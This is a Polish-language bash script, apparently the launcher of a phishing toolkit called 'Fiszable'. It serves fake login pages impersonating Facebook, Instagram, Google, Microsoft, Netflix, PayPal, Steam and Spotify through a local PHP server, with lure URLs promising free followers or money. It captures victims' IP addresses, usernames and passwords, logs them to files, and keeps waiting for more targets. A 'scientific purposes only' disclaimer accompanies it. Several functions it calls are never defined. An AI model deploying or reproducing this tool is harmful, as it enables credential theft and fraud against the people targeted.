#!/bin/bash

##   Fiszable 	: 	Polskie Szablony Phishingowe
##   Autor 	: 	REMO FALLER 
##   Wersja 	: 	1.0.2
##   Github 	: 	https://github.com/Remo-Faller/Fiszable

##
##      Copyright (C) 2024  REMO-FALLER (https://github.com/Remo-Faller)
##
__version__="1.0.2"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".serwer" ]]; then
	mkdir -p ".serwer"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".serwer/www" ]]; then
	rm -rf ".serwer/www"
	mkdir -p ".serwer/www"
else
	mkdir -p ".serwer/www"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Przerwano Program." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Zamknięto Program." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Stan Połączenia : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
		${RED}Wersja : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Narzędzie stworzone przez Remo Faller${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie wymaganych pakietów..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie pakietu : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie pakietu : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pakiety są zainstalowane."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie pakietu : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Menadżer Pakietów nie jest wspierany. Zainstaluj pakiety ręcznie."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .serwer/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .serwer/$output > /dev/null 2>&1
		else
			mv -f $file .serwer/$output > /dev/null 2>&1
		fi
		chmod +x .serwer/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Wystąpił błąd w trakcie pobierania ${output}."
		{ reset_color; exit 1; }
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Dziękuję za wybranie narzędzia Fiszable. Miłego dnia.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Autor   ${RED}:  ${ORANGE}REMO FALLEER ${RED}[ ${ORANGE}REMO-FALLER ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Remo-Faller
		${GREEN} Wersja  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}UWAGA:${RESETBG}
		${CYAN}  Ten skrypt służy wyłącznie do celów naukowych!
		${RED}!${WHITE}${CYAN} Autor nie odpowiada za jego użycie w
                celach zabronionych prawnie ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Menu Główne     ${RED}[${WHITE}99${RED}]${ORANGE} Wyjście

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Powrót do menu głównego..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcja niedostępna. Wybierz ponownie..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Czy Chcesz Ustawić Własny PORT ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Wpisz 4-cyfry PORTu [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowy Numer PORTu : $CU_P, Spróbuj ponownie...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Użyj Domyślnego PORTu $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Przygotowywanie Serwera..."${WHITE}
	cp -rf .strony/"$website"/* .serwer/www
	cp -f .strony/ip.php .serwer/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Uruchamianie Serwera PHP..."${WHITE}
	cd .serwer/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .serwer/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} IP Celu : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Zapisano w : ${ORANGE}auth/ip.txt"
	cat .serwer/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Użytkownik:.*' .serwer/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Hasło:.*' .serwer/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Konto : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hasło : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Zapisano w : ${ORANGE}auth/usernames.dat"
	cat .serwer/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Oczekiwanie Na Kolejne Cele, ${BLUE}Ctrl + C ${ORANGE}aby wyjść. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Oczekiwanie Na Kolejne Cele, ${BLUE}Ctrl + C ${ORANGE}aby wyjść..."
	while true; do
		if [[ -e ".serwer/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Wykryto IP !"
			capture_ip
			rm -rf .serwer/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".serwer/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Wykryto Logowanie !!"
			capture_creds
			rm -rf .serwer/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Uruchamianie... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hosting zakończony sukcesem : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Standardowa Strona Logowania
		${RED}[${WHITE}02${RED}]${ORANGE} Ankiety Facebook
		${RED}[${WHITE}03${RED}]${ORANGE} Fałszywa Strona Zabezpieczeń
		${RED}[${WHITE}04${RED}]${ORANGE} Strona Logowania Messenger

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcja niedostępna. Wybierz ponownie..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Standardowa Strona Logowania
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcja niedostępna. Wybierz ponownie..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Stara Wersja
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail Nowa Wersja
		${RED}[${WHITE}03${RED}]${ORANGE} Ankiety Google

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcja niedostępna. Wybierz ponownie..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Wybierz sposób ataku... ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}05${RED}]${ORANGE} Netflix
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}06${RED}]${ORANGE} Paypal
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}07${RED}]${ORANGE} Steam
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}08${RED}]${ORANGE} Spotify

		${RED}[${WHITE}99${RED}]${ORANGE} Info          ${RED}[${WHITE}00${RED}]${ORANGE} Wyjście

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcja niedostępna. Wybierz ponownie..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Tunnel menu
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Sieć Lokalna
		${RED}[${WHITE}02${RED}]${ORANGE} BRAK         ${RED}[${CYAN}Dostępne Wkrótce${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} BRAK         ${RED}[${CYAN}Dostępne Wkrótce${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz sposób udostępniania plików : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcja niedostępna. Wybierz ponownie..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Main
kill_pid
dependencies
check_status
main_menu
